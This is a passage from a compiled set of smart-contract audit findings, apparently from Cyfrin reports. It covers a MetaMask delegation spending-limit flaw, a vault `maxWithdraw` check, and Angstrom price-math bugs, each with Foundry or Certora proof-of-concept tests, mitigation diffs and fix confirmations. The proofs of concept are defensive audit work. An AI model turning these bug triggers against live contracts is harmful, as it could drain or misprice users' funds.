        caveats[0] = Caveat({ enforcer: address(allowedTargetsEnforcer), terms: abi.encodePacked(address(mockToken)), args: hex"" });

        // Allowed Methods Enforcer - allow only transfer
        caveats[1] =
            Caveat({ enforcer: address(allowedMethodsEnforcer), terms: abi.encodePacked(IERC20.transfer.selector), args: hex"" });

        // ERC20 Transfer Amount Enforcer - limit to TRANSFER_LIMIT tokens
        caveats[2] = Caveat({
            enforcer: address(transferAmountEnforcer),
            terms: abi.encodePacked(address(mockToken), uint256(TRANSFER_LIMIT)),
            args: hex""
        });

        Delegation memory delegation = Delegation({
            delegate: address(users.bob.deleGator),
            delegator: address(users.alice.deleGator),
            authority: ROOT_AUTHORITY,
            caveats: caveats,
            salt: 0,
            signature: hex""
        });

        // Sign the delegation
        delegation = signDelegation(users.alice, delegation);

        // First, verify the initial spent amount is 0
        bytes32 delegationHash = EncoderLib._getDelegationHash(delegation);
        uint256 initialSpent = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
        assertEq(initialSpent, 0, "Initial spent should be 0");

        // Initial balances
        uint256 aliceInitialBalance = mockToken.balanceOf(address(users.alice.deleGator));
        uint256 bobInitialBalance = mockToken.balanceOf(address(users.bob.addr));
        console.log("Alice initial balance:", aliceInitialBalance / 1e18);
        console.log("Bob initial balance:", bobInitialBalance / 1e18);

        // Amount to transfer
        uint256 amountToTransfer = 500 ether;

        // Create the mode for try execution
        ModeCode tryExecuteMode = ModeLib.encode(CALLTYPE_SINGLE, EXECTYPE_TRY, MODE_DEFAULT, ModePayload.wrap(bytes22(0x00)));

        // First test successful transfer
        {
            // Make sure token transfers will succeed
            mockToken.setHaltTransfer(false);

            // Prepare transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(
                    IERC20.transfer.selector,
                    address(users.bob.addr), // Transfer to Bob's EOA
                    amountToTransfer
                )
            });

            // Execute the delegation with try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after successful transfer
            uint256 aliceBalanceAfterSuccess = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterSuccess = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after successful transfer:", aliceBalanceAfterSuccess / 1e18);
            console.log("Bob balance after successful transfer:", bobBalanceAfterSuccess / 1e18);

            // Check spent map was updated
            uint256 spentAfterSuccess = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
            console.log("Spent amount after successful transfer:", spentAfterSuccess / 1e18);
            assertEq(spentAfterSuccess, amountToTransfer, "Spent amount should be updated after successful transfer");

            // Verify the transfer actually occurred
            assertEq(aliceBalanceAfterSuccess, aliceInitialBalance - amountToTransfer);
            assertEq(bobBalanceAfterSuccess, bobInitialBalance + amountToTransfer);
        }

        // Now test failing transfer
        {
            // Make token transfers fail
            mockToken.setHaltTransfer(true);

            // Prepare failing transfer execution
            Execution memory execution = Execution({
                target: address(mockToken),
                value: 0,
                callData: abi.encodeWithSelector(
                    IERC20.transfer.selector,
                    address(users.bob.addr), // Transfer to Bob's EOA
                    amountToTransfer
                )
            });

            // Execute the delegation with try mode
            execute_UserOp(
                users.bob,
                abi.encodeWithSelector(
                    delegationManager.redeemDelegations.selector,
                    createPermissionContexts(delegation),
                    createModes(tryExecuteMode),
                    createExecutionCallDatas(execution)
                )
            );

            // Check balances after failed transfer
            uint256 aliceBalanceAfterFailure = mockToken.balanceOf(address(users.alice.deleGator));
            uint256 bobBalanceAfterFailure = mockToken.balanceOf(address(users.bob.addr));
            console.log("Alice balance after failed transfer:", aliceBalanceAfterFailure / 1e18);
            console.log("Bob balance after failed transfer:", bobBalanceAfterFailure / 1e18);

            // Check spent map after failed transfer
            uint256 spentAfterFailure = transferAmountEnforcer.spentMap(address(delegationManager), delegationHash);
            console.log("Spent amount after failed transfer:", spentAfterFailure / 1e18);

            // THE KEY TEST: The spent amount increased even though the transfer failed!
            assertEq(spentAfterFailure, amountToTransfer * 2, "Spent amount should increase even with failed transfer");

            // Verify tokens weren't actually transferred
            assertEq(aliceBalanceAfterFailure, aliceInitialBalance - amountToTransfer);
            assertEq(bobBalanceAfterFailure, bobInitialBalance + amountToTransfer);
        }
    }
```

**Recommended Mitigation:** Consider one of the following options:
1. Implement a post check in afterHook() with following steps
    - track the initial balance in beforeHook
    - track the actual balance in afterHook
    - only update spend limit based on actual - initial -> in the afterHook

2. Alternatively, enforce `TransferAmountEnforcers` to be of execution type `EXECTYPE_DEFAULT` only,

**Metamask:** Fixed in commit [cdd39c6](https://github.com/MetaMask/delegation-framework/commit/cdd39c62d65436da0d97bff53a7a5714a3505453)

**Cyfrin:** Resolved. Restricted execution type to only `EXECTYPE_DEFAULT`

## [M-16] Invalid `maxWithdraw()` check in `withdraw()`
- Severity: `Medium`
- Source report: `accountable.md`

### Detailed Content (from source)
**Description:** Vault incorrectly checks `maxWithdraw(receiver)` instead of `maxWithdraw(controller/owner)`.

**Impact:**
- Allows unauthorized withdrawals by exploiting the receiver's limits instead of the owner's.
- DDoS in `withdraw()`

**Proof of Concept:** ❌ Violated: https://prover.certora.com/output/52567/ef88bd2d76b74cafb175f8d026e484b3/?anonymousKey=599db11fbc5df1632ff4006c69a03f836b23fa6c

```solidity
// MUST NOT be higher than the actual maximum that would be accepted
rule eip4626_maxWithdrawNoHigherThanActual(env e, uint256 assets, address receiver, address owner) {

    setup(e);

    storage init = lastStorage;

    mathint limit = maxWithdraw(e, owner) at init;

    withdraw@withrevert(e, assets, receiver, owner) at init;
    bool reverted = lastReverted;

    // Withdrawals above the limit must revert
    assert(assets > limit => reverted, "Withdraw above limit MUST revert");
}
```

✅ Verified after the fix: https://prover.certora.com/output/52567/8e7cfdf612d64a4cb7e5d9d9d939968e/?anonymousKey=a961467ded443bd1cab3718ca882be71f38887e9

**Recommended Mitigation:**
```diff
diff --git a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol
index a64f47c..c8824bb 100644
--- a/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol
+++ b/credit-vaults-internal/src/vault/AccountableAsyncRedeemVault.sol
@@ -173,7 +173,7 @@ contract AccountableAsyncRedeemVault is IAccountableAsyncRedeemVault, Accountabl
     function withdraw(uint256 assets, address receiver, address controller) public onlyAuth returns (uint256 shares) {
         _checkController(controller);
         if (assets == 0) revert ZeroAmount();
-        if (assets > maxWithdraw(receiver)) revert ExceedsMaxRedeem();
+        if (assets > maxWithdraw(controller)) revert ExceedsMaxRedeem(); // @certora FIX for eip4626_maxWithdrawNoHigherThanActual (receiver -> controller)

         VaultState storage state = _vaultStates[controller];
         shares = _convertToShares(assets, state.withdrawPrice, Math.Rounding.Floor);
```

**Accountable:** Fixed in commit [`6dc92b0`](https://github.com/Accountable-Protocol/credit-vaults-internal/commit/6dc92b0b09e8d2e2fc01b94d41902bbf4f5fc293)

**Cyfrin:** Verified. `controller` now passed to `maxWithdraw`.

\clearpage

## [M-17] `CompensationPriceFinder::getZeroForOne` may compute smaller effective prices than expected
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** `CompensationPriceFinder::getOneForZero` contains a conditional branch that exists to skip execution that would result in reverts either due to underflow or division by zero:

```solidity
@>  if (sumAmount0Deltas > taxInEther) {
@>      uint256 simplePstarX96 = sumAmount1Deltas.divX96(sumAmount0Deltas - taxInEther);
        if (simplePstarX96 <= uint256(priceUpperSqrtX96).mulX96(priceUpperSqrtX96)) {
            pstarSqrtX96 = _oneForZeroGetFinalCompensationPrice(...);

            return (lastTick, pstarSqrtX96);
        }
    }
```

This logic is also present in `CompensationPriceFinder::getZeroForOne`; however, in this case, neither underflow nor division by zero is possible:

```solidity
@>  if (sumAmount0Deltas > taxInEther) {
        if (
@>          sumAmount1Deltas.divX96(sumAmount0Deltas + taxInEther)
                >= uint256(priceLowerSqrtX96).mulX96(priceLowerSqrtX96)
        ) {
            pstarSqrtX96 = _zeroForOneGetFinalCompensationPrice(...);

            return (lastTick, pstarSqrtX96);
        }
    }
```

This could result in the effective price calculation being skipped even when it would have been validated to lie within the current tick range, since the threshold ratio could be satisfied even when `sumAmount0Deltas <= taxInEther`.

Furthermore, after all the ticks have been iterated, there is a subsequent asymmetry when checking the effective price condition:

```solidity
if (simplePstarX96 > uint256(priceLowerSqrtX96).mulX96(priceLowerSqrtX96)) {
```

Here, if the effective price is exactly equal to the end tick then execution will fall through to returning a 512-bit square root price based on `simplePstarX96` instead of executing `_oneForZeroGetFinalCompensationPrice()`.

**Impact:** This may result in computation of a smaller effective price than expected, compensating liquidity providers who otherwise shouldn't be compensated.

**Recommended Mitigation:**
```diff
    function getZeroForOne(
        TickIteratorDown memory ticks,
        uint128 liquidity,
        uint256 taxInEther,
        uint160 priceUpperSqrtX96,
        Slot0 slot0AfterSwap
    ) internal view returns (int24 lastTick, uint160 pstarSqrtX96) {
        uint256 sumAmount0Deltas = 0; // X
        uint256 sumAmount1Deltas = 0; // Y

        uint160 priceLowerSqrtX96;
        while (ticks.hasNext()) {
            lastTick = ticks.getNext();
            priceLowerSqrtX96 = TickMath.getSqrtPriceAtTick(lastTick);

            {
                uint256 delta0 = SqrtPriceMath.getAmount0Delta(
                    priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false
                );
                uint256 delta1 = SqrtPriceMath.getAmount1Delta(
                    priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false
                );
                sumAmount0Deltas += delta0;
                sumAmount1Deltas += delta1;

--              if (sumAmount0Deltas > taxInEther) {
                    if (
                        sumAmount1Deltas.divX96(sumAmount0Deltas + taxInEther)
                            >= uint256(priceLowerSqrtX96).mulX96(priceLowerSqrtX96)
                    ) {
                        pstarSqrtX96 = _zeroForOneGetFinalCompensationPrice(
                            priceUpperSqrtX96,
                            taxInEther,
                            liquidity,
                            sumAmount0Deltas - delta0,
                            sumAmount1Deltas - delta1
                        );
                        return (lastTick, pstarSqrtX96);
                    }
--              }
            }

            (, int128 liquidityNet) = ticks.manager.getTickLiquidity(ticks.poolId, lastTick);
            require(int128(liquidity) >= liquidityNet, "getZeroForOne: liquidity < liquidityNet");
            liquidity = liquidity.sub(liquidityNet);

            priceUpperSqrtX96 = priceLowerSqrtX96;
        }

        priceLowerSqrtX96 = slot0AfterSwap.sqrtPriceX96();

        uint256 delta0 =
            SqrtPriceMath.getAmount0Delta(priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false);
        uint256 delta1 =
            SqrtPriceMath.getAmount1Delta(priceLowerSqrtX96, priceUpperSqrtX96, liquidity, false);
        sumAmount0Deltas += delta0;
        sumAmount1Deltas += delta1;

        uint256 simplePstarX96 = sumAmount1Deltas.divX96(sumAmount0Deltas + taxInEther);
--      if (simplePstarX96 > uint256(priceLowerSqrtX96).mulX96(priceLowerSqrtX96)) {
++      if (simplePstarX96 >= uint256(priceLowerSqrtX96).mulX96(priceLowerSqrtX96)) {
            pstarSqrtX96 = _zeroForOneGetFinalCompensationPrice(
                priceUpperSqrtX96,
                taxInEther,
                liquidity,
                sumAmount0Deltas - delta0,
                sumAmount1Deltas - delta1
            );

            return (type(int24).min, pstarSqrtX96);
        }
        (uint256 p1, uint256 p0) = Math512Lib.checkedMul2Pow96(0, simplePstarX96);

        return (type(int24).min, Math512Lib.sqrt512(p1, p0).toUint160());
    }
```

**Sorella Labs:** Fixed in commit [f09acd4](https://github.com/SorellaLabs/l2-angstrom/commit/f09acd43ceb05bfc06ba5e8d674d333554adb982). The `if (sumAmount0Deltas > taxInEther) {` in the zero-for-one case can actually lead to computing wrong compensation prices, it's only triggered for very large tick spacings though (>6,900 I think) so arguably still low.

**Cyfrin:** Verified. The outer conditional branch has been removed.

## [M-18] `rewardGrowthOutsideX128` is not correctly initialized in `PoolRewards::updateAfterLiquidityAdd`
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** The Uniswap V3/V4 convention is that if a tick has just been initialized, and the current tick is to the right of that tick, then its `feeGrowthOutside[0/1]X1278` values must be initialized with `feeGrowthGlobal[0/1]X128`.

`PoolRewards::updateAfterLiquidityAdd` intends to replicate this logic and initialize the `rewardGrowthOutsideX128` for the relevant ticks; however, this function is called as part of the `AngstromL2::afterAddLiquidity` hook, at which point the ticks are initialized as the liquidity is non-zero. Thus e.g. `!pm.isInitialized(...)` will always return `false` and hence the body of the if-statement will never be executed, meaning this state is never initialized.

Fortunately, the presence of `lastGrowthInsideX128` corrects for what would otherwise be an overflow vector, mitigating for any potential impact. In the following analysis, let values be taken modulo 1000 for simplicity, i.e., within the range `[0, 999]` with wraparound at 1000.

Abbreviations:
- `gi` is `growthInsideX128`
- `lgi` is `lastGrowthInsideX128`
- `rgo` is `rewardsGrowthOutsideX128`
- `t` is current tick
- `G` is `globalGrowthX128`

Assume:
- `G == 10`
- `rgo[0] == 3`
- `rgo[10]` uninitialized
- `t = 11`

Now add some liquidity in `[0,10]`
`lgi = 0 - 3 = 997`

Consider the following three cases for `t`, assuming no new rewards were added.

**Case 1**: t has not moved
```
  gi - lgi
= rgo[10] - rgo[0] - lgi
= 0 - 3 - 997 = 997 - 997 = 0
```

**Case 2**: 0 <= t < 10
- `rgo[10]` flipped from 0 to 10 as `t` moved left

```
    gi - lgi
== G - rgo[0] - rgo[10] - lgi
== 10 - 3 - 10 - 997
== 997 - 997
== 0
```

**Case 3**: t < 0
Now `rgo[0]` flipped to `7 == 10 - 3` as `t` moved left

```
    gi - lgi
== rgo[0] - rgo[10] - lgi
== 7 - 10 - 997
== 997 - 997
== 0
```

Now reconsider the final two cases when rewards _do_ grow.

**Case 2**: `0 <= t < 10`.
- `G` grew by 2 to `12`
- `rgo[10]` grew by `1` (after flipping) to `11`

```
    gi - lgi
== 12 - 3 - 11 - 997
== 998 - 997
== 1
```

**Case 3**:  `t < 0`
- `G` grew by 3 to `13` (combination of rgo[10] and rgo[0] growth below)
- `rgo[10]` grew by 2 to `12`.
- `rgo[0]` grew by a further 1 (after flipping). `rgo[0] = 7 + 2 + 1 == 10`

```
    gi - lgi
== 10 - 12 - 997
== 998 - 997
== 1
```

This demonstrates that it is the cumulative growth of rewards outside that protects this logic from underflow.

**Proof of Concept:** The following test, which should be added to `AngstromL2.t.sol`, demonstrates how `rewardGrowthOutsideX128` is not correctly initialized:

```solidity
function test_cyfrin_IncorrectGrowthOutsideInitialization() public {
    uint256 PRIORITY_FEE = 0.7 gwei;
    PoolKey memory key = initializePool(address(token), 10, 7);

    angstrom.setPoolLPFee(key, 0.0005e6);
    addLiquidity(key, 0, 30, 10e21);
    bumpBlock();

    setPriorityFee(PRIORITY_FEE);

    // swap left and right to build up feeGrowthGlobal in both currencies
    router.swap(key, true,  -1000e18, int24(1).getSqrtPriceAtTick());
    bumpBlock();
    router.swap(key, false, -1000e18, int24(25).getSqrtPriceAtTick());

    setPriorityFee(0);
    bumpBlock();
    int24 tickLower = 10;
    int24 tickUpper = 20;
    addLiquidity(key, tickLower, tickUpper, 10e21);

    PoolId id = key.toId();

    // lower tick
    {
        (uint256 lowerFeeGrowthOutside0X128, uint256 lowerFeeGrowthOutside1X128) = StateLibrary.getTickFeeGrowthOutside(manager, id, tickLower);
        (uint256 lowerFeeGrowthGlobal0X128, uint256 lowerFeeGrowthGlobal1X128) = StateLibrary.getFeeGrowthGlobals(manager, id);
        uint256 lowerRewardGlobalGrowthX128 = angstrom.getRewardGlobalGrowthX128(id);
        uint256 lowerRewardGrowthOutsideX128 = angstrom.getRewardGrowthOutsideX128(id, tickLower);
        assertGt(lowerFeeGrowthGlobal0X128, 0);
        assertGt(lowerFeeGrowthGlobal1X128, 0);
        assertEq(lowerFeeGrowthOutside0X128, lowerFeeGrowthGlobal0X128);
        assertEq(lowerFeeGrowthOutside1X128, lowerFeeGrowthGlobal1X128);
        assertGt(lowerRewardGlobalGrowthX128, 0);
        /* BUG: lowerRewardGrowthOutsideX128 should be non-zero since lowerRewardGlobalGrowthX128 is non-zero! */
        assertEq(lowerRewardGrowthOutsideX128, 0);
    }

    // upper tick
    {
        (uint256 upperFeeGrowthOutside0X128, uint256 upperFeeGrowthOutside1X128) = StateLibrary.getTickFeeGrowthOutside(manager, id, tickUpper);
        (uint256 upperFeeGrowthGlobal0X128, uint256 upperFeeGrowthGlobal1X128) = StateLibrary.getFeeGrowthGlobals(manager, id);
        uint256 upperRewardGlobalGrowthX128 = angstrom.getRewardGlobalGrowthX128(id);
        uint256 upperRewardGrowthOutsideX128 = angstrom.getRewardGrowthOutsideX128(id, tickUpper);
        assertGt(upperFeeGrowthGlobal0X128, 0);
        assertGt(upperFeeGrowthGlobal1X128, 0);
        assertEq(upperFeeGrowthOutside0X128, upperFeeGrowthGlobal0X128);
        assertEq(upperFeeGrowthOutside1X128, upperFeeGrowthGlobal1X128);
        assertGt(upperRewardGlobalGrowthX128, 0);
        /* BUG: upperRewardGrowthOutsideX128 should be non-zero since upperRewardGlobalGrowthX128 is non-zero! */
        assertEq(upperRewardGrowthOutsideX128, 0);
    }
}
```

To successfully compile, first include the following import statements:

```solidity
import {StateLibrary} from "v4-core/src/libraries/StateLibrary.sol";
import {Position} from "../src/types/PoolRewards.sol";
```

Next, include the following test harness:

```solidity
contract AngstromL2Harness is AngstromL2 {
    constructor(IPoolManager uniV4, address owner, IFlashBlockNumber flashBlockNumberProvider)
        AngstromL2(uniV4, owner, flashBlockNumberProvider)
    {}

    function getRewardGrowthOutsideX128(PoolId id, int24 tick) public returns (uint256) {
        return rewards[id].rewardGrowthOutsideX128[tick];
    }

    function getRewardLastGrowthInsideX128(PoolId id, address owner, int24 tickLower, int24 tickUpper, bytes32 salt) public returns (uint256) {
        (Position storage pos, ) = rewards[id].getPosition(owner, tickLower, tickUpper, salt);
        return pos.lastGrowthInsideX128;
    }

    function getRewardGlobalGrowthX128(PoolId id) public returns (uint256) {
        return rewards[id].globalGrowthX128;
    }
}
```

And finally update the setup accordingly:

```solidity
AngstromL2Harness angstrom;
...
angstrom = AngstromL2Harness(
    deployAngstromL2(
        type(AngstromL2Harness).creationCode,
        IPoolManager(address(manager)),
        address(this),
        getRequiredHookPermissions(),
        IFlashBlockNumber(address(0))
    )
);
```

**Recommended Mitigation:** Implement the `beforeAddLiquidity()` hook and corresponding permission to call `PoolRewards::updateAfterLiquidityAdd` prior to adding liquidity.

**Sorella Labs:** Fixed in commit [cd0ac3c](https://github.com/SorellaLabs/l2-angstrom/commit/cd0ac3c1e8ad9ac1fc80820cb130b981429ca13d).

**Cyfrin:** Verified. The Uniswap initialization convention has been removed entirely to simplify the accumulator logic.

\clearpage
## Gas Optimization

## [M-19] Effective price calculations can be affected by edge cases in `Math512Lib::sqrt512` and `Math512Lib::div512by256`
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** `Math512Lib::sqrt512` implements a full-width integer Newton-Raphson square root. This hinges on the assumption that the initial guess is larger than the upper limb and fits within 256 bits such that the iteration is strictly monotonically decreasing, i.e. converges on the true square root. However, when the most significant bit of the upper limb is odd, floor division by two can result in an initial guess that is smaller than the upper limb, causing the quotient of `floor(([x1 x0]) / root) >= 2^256` to be too wide.

```solidity
function sqrt512(uint256 x1, uint256 x0) internal pure returns (uint256 root) {
    if (x1 == 0) {
        return FixedPointMathLib.sqrt(x0);
    }
@>  root = 1 << (128 + (LibBit.fls(x1) / 2));
    uint256 last;
    do {
        last = root;
        // Because `floor(sqrt(UINT512_MAX)) = 2^256-1` and guesses converging towards the
        // correct result the result of all divisions is guaranteed to fit within 256 bits.
@>      (, root) = div512by256(x1, x0, root);
        root = (root + last) / 2;
    } while (root != last);
    return root;
}
```

The high digit returned by `Math512Lib::div512by256` is correctly ignored per the intended implementation details, although this also depends on the assumption that the initial guess fits within 256 bits which can be violated as demonstrated.

Furthermore, the implementation of `Math512Lib::div512by256` is such that the long division should be equivalent to the Solady implementation from which it was adapted. This is not the case, as the synthesis of $2^{256}$ in calculating the remainder with the upper limb in place of `r1` is incorrect:

```solidity
/// @dev Computes `[x1 x0] / d`
function div512by256(uint256 x1, uint256 x0, uint256 d)
    internal
    pure
    returns (uint256 y1, uint256 y0)
{
    if (d == 0) revert DivisorZero();
    assembly {
        // Compute first "digit" of long division result
        y1 := div(x1, d)
        // We take the remainder to continue the long division
        let r1 := mod(x1, d)
        // We complete the long division by computing `y0 = [r1 x0] / d`. We use the "512 by
        // 256 division" logic from Solady's `fullMulDiv` (Credit under MIT license:
        // https://github.com/Vectorized/solady/blob/main/src/utils/FixedPointMathLib.sol)

        // We need to compute `[r1 x0] mod d = r1 * 2^256 + x0 = (r1 * 2^128) * 2^128 + x0`.
@>      let r := addmod(mulmod(shl(128, x1), shl(128, 1), d), x0, d)

        // Same math from Solady, reference `fullMulDiv` for explanation.
        let t := and(d, sub(0, d))
        d := div(d, t)
        let inv := xor(2, mul(3, d)) // inverse mod 2**4
        inv := mul(inv, sub(2, mul(d, inv))) // inverse mod 2**8
        inv := mul(inv, sub(2, mul(d, inv))) // inverse mod 2**16
        inv := mul(inv, sub(2, mul(d, inv))) // inverse mod 2**32
        inv := mul(inv, sub(2, mul(d, inv))) // inverse mod 2**64
        inv := mul(inv, sub(2, mul(d, inv))) // inverse mod 2**128
        // Edits vs Solady: `x0` replaces `z`, `r1` replaces `p1`, final 256-bit result stored in `y0`
        y0 :=
            mul(
@>              or(mul(sub(r1, gt(r, x0)), add(div(sub(0, t), t), 1)), div(sub(x0, r), t)),
                mul(sub(2, mul(d, inv)), inv) // inverse mod 2**256
            )
    }
}
```

Rather than forming the desired computation, the left shift construction truncates the top 128 bits before the modulo step. The magnitude of these dropped high bits determines whether `r` and hence `y0` is biased upward or downward by application of the borrow step.

Combined, these issues have serious implications for the overall computation of the effective price:

* Every invocation of `Math512Lib::div512by256` in `CompensationPriceFinder` asserts that the upper bits are zero. This holds true so long as `x1 < d`, i.e. the upper bits of `L +/- sqrt(D)` are less than `A = Xhat + x - B` such that the solution fits within 256 bits. Thus, the upper 128 bits of `L + sqrt(D)`, can be used to influence the calculated compensation price. This is dependent entirely on the liquidity distribution, so by extension the lower/upper tick prices, range reserves, and delta sums. However, note that this can also be influenced by incorrect application of the square root when computing `sqrt(D)`.
* The invocation of `Math512Lib::div512by256` in `Math512Lib::sqrt512` ignores the upper limb, so it is the upper 128 bits of the input upper limb that influence the resulting root calculation, along with the bug in `Math512Lib::sqrt512` itself. If the last set bit is even, then the returned root can deviate around the true root, since the `Math512Lib::sqrt512` implementation will converge on the true root but the `Math512Lib::div512by256` implementation will incorrectly apply the borrow step. If the last set bit is odd, then the returned root will be significantly smaller than the true root, and again this can deviate in both directions depending on the upper 128 bits of the upper limb.
* `CompensationPriceFinder::getZeroForOne` and `CompensationPriceFinder::getOneForZero` both pass the full precision multiplication of `simplePstarX96` with `2**96` which requires at most 353 bits (i.e. empty upper 128 bits of the upper limb). Therefore, these invocations of `Math512Lib::sqrt512` should only be affected if the last set bit is odd.
* In `CompensationPriceFinder::_zeroForOneGetFinalCompensationPrice`, the numerator `-L + sqrt(D)` will be computed incorrectly if the last set bit of `D * 2^192` is odd. Again, this is entirely dependent on the liquidity distribution and will result in a smaller numerator than expected (assuming underflow is avoided). Execution then continues to `Math512Lib::div512by256` which could return a lower compensation price than expected. Similar is true of the negative `A` branch, except the numerator and resulting compensation price would be larger than expected.
* In `CompensationPriceFinder::_oneForZeroGetFinalCompensationPrice`, the numerator `L + sqrt(D)` will be computed incorrectly in a manner similar to the above, resulting in a smaller numerator and compensation price.

**Impact:** `Math512Lib::sqrt512` is not strictly monotonically decreasing and `Math512Lib::div512by256` incorrectly computes long division. This can result in the effective price calculations being incorrect.

**Proof of Concept:** Create a new file `Math512Lib.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {console, Test} from "forge-std/Test.sol";
import {stdError} from "forge-std/StdError.sol";
import {LibBit} from "solady/src/utils/LibBit.sol";
import {FixedPointMathLib} from "solady/src/utils/FixedPointMathLib.sol";
import {Math512Lib} from "../../src/libraries/Math512Lib.sol";

contract Math512LibHarness {
    using Math512Lib for uint256;

    function fullMul(uint256 x, uint256 y) public pure returns (uint256 z1, uint256 z0) {
        return Math512Lib.fullMul(x, y);
    }

    function sqrt512(uint256 x1, uint256 x0) public pure returns (uint256) {
        return Math512Lib.sqrt512(x1, x0);
    }

    function div512by256(uint256 x1, uint256 x0, uint256 d) public pure returns (uint256 y1, uint256 y0) {
        return Math512Lib.div512by256(x1, x0, d);
    }
}

contract Math512LibTest is Math512LibHarness, Test {
    // BUG: when msb is odd in [129, 245], the quotient is too wide
    function test_oddMsbInitialRootArithmeticError(uint8 msb) public {
        uint256 x0;

        // Choose a msb that is odd and in [129, 245] such that LibBit.fls(x1) returns an odd index
        msb = uint8(129 + 2 * bound(msb, 0, (245 - 129) / 2));

        uint256 x1 = uint256(1) << msb;

        uint256 p = LibBit.fls(x1);
        assertEq(p, msb, "index not equal to msb");
        assertEq(p % 2, 1, "index not odd");

        // Rounds down when p is odd, so we have r0 = 2^(128 + 64) = 2^193
        uint256 r0 = uint256(1) << (128 + (p / 2));

        // If root <= x1, then floor(([x1 x0]) / root) >= 2^256, i.e. quotient too wide.
        if (r0 <= x1) console.log("initial root <= x1 when msb is odd -> unsafe: quotient too wide");

        vm.expectRevert(stdError.arithmeticError);
        uint256 root = this.sqrt512(x1, x0);
    }

    // BUG: when msb is odd in [247, 255], initial root computation overflows
    function test_oddMsbInitialRootOverflow(uint8 msb) public {
        uint256 x0;

        // ensure msb is odd and in [247, 255]
        msb = uint8(247 + 2 * bound(msb, 0, (255 - 247) / 2));
        uint256 x1 = uint256(1) << msb;

        uint256 r0 = uint256(1) << (128 + (LibBit.fls(x1) / 2));
        if (msb != 255) assertGt(r0, x1, "initial root not > x1");

        vm.expectRevert("DivisorZero()");
        uint256 root = this.sqrt512(x1, x0);
    }

    // BUG: when msb is 254 (max even < 256), initial root computation overflows
    function test_evenMsbInitialRootOverflow() public {
        uint256 x0;

        uint8 msb = 254; // max even < 256
        uint256 x1 = uint256(1) << msb;

        uint256 r0 = uint256(1) << (128 + (LibBit.fls(x1) / 2));
        assertGt(r0, x1, "initial root not > x1");

        vm.expectRevert(stdError.arithmeticError);
        uint256 root = this.sqrt512(x1, x0);
    }

    // NOTE: when msb is even in [0, 254), initial root computation is safe
    function test_evenMsbInitialRoot(uint8 msb) public {
        uint256 x0;

        vm.assume(msb % 2 == 0 && msb < 254);
        uint256 x1 = uint256(1) << msb;

        uint256 r0 = uint256(1) << (128 + (LibBit.fls(x1) / 2));
        assertGt(r0, x1, "initial root not > x1");

        uint256 root = this.sqrt512(x1, x0);
    }

    // BUG: when x1 <= d, the quotient fits in 256 bits and y1 should be zero; however,
    // there are cases in which the high digit is not zero, so it should not be ignored
    function test_discardHighDigit(uint256 x0, uint256 x1, uint256 d) public {
        // Only allow inputs that should result in a y1 of 0 (i.e. quotient fits in 256 bits)
        vm.assume(d != 0 && x1 <= d);

        (uint256 y1, ) = this.div512by256(x1, x0, d);

        assertEq(y1, 0, "y1 not zero -> quotient too wide");
    }

    // BUG: when x1 <= d, the quotient fits in 256 bits and y1 should be zero; however,
    // there are cases in which y0 does not collapse to FixedPointMathLib.fullMulDiv(r1, x0, d)
    function test_fullMulDivEquivalence(uint256 x0, uint256 x1, uint256 d) public {
        // Compute 512-bit product
        (uint256 p1, uint256 p0) = this.fullMul(x1, x0);

        // Ensure the high digit does not exceed d; otherwise, the quotient does not fit in 256 bits
        vm.assume(d != 0 && p1 <= d);

        (uint256 y1, uint256 y0) = this.div512by256(p1, p0, d);
        uint256 z = FixedPointMathLib.fullMulDiv(x1, x0, d);

        assertEq(y1, 0, "y1 not zero -> quotient too wide");
        assertEq(y0, z, "y0 not equal to z -> incorrect quotient");
    }
}
```

**Recommended Mitigation:** Ensure that the initial square root guess is always larger than the upper limb such that the iteration is monotonically decreasing.

Compute the long division remainder as:

```solidity
let r := addmod(addmod(mulmod(r1, not(0), d), r1, d), x0, d)
```

**Sorella Labs:** Fixed in commit [5a21cf7](https://github.com/SorellaLabs/l2-angstrom/commit/5a21cf770f65fe18573955155ecca0c5b1a815fa).

**Cyfrin:** Verified. The initial square root guess now always starts at or above the correct result and division is computed without discarding the upper bits.

## [M-20] Swaps will revert when `A = B + Xhat - x = 0`
- Severity: `Medium`
- Source report: `angstrom.md`

### Detailed Content (from source)
**Description:** `CompensationPriceFinder::_zeroForOneGetFinalCompensationPrice` implements two branches depending on the sign of `A`. The following logic executes when it is positive, but note that `A` will equal zero when `sumX` is exactly equal to `rangeVirtualReserves0`, i.e. $$A = B + \hat X - x = 0$$:

```solidity
    if (sumX >= rangeVirtualReserves0) {
        // `A` is positive, compute `D = y * (Xhat + B) + A * Yhat`, `p* = (-L + sqrt(D)) / A`.
@>      uint256 a = sumX - rangeVirtualReserves0;
        {
            (uint256 ay1, uint256 ay0) = Math512Lib.fullMul(a, sumUpToThisRange1);
            (d1, d0) = Math512Lib.checkedAdd(d1, d0, ay1, ay0);
        }
        // Compute `sqrtDX96 := sqrt(D) * 2^96 <> sqrt(D * 2^192)`
        (d1, d0) = Math512Lib.checkedMul2Pow192(d1, d0);
        // Reuse `d1, d0` to store numerator `-L + sqrt(D)`.
        (d1, d0) =
            Math512Lib.checkedSub(0, Math512Lib.sqrt512(d1, d0), 0, uint256(liquidity) << 96);
@>      (uint256 upperBits, uint256 p1) = Math512Lib.div512by256(d1, d0, a);
        assert(upperBits == 0);

        return p1.toUint160();
    } else {
```

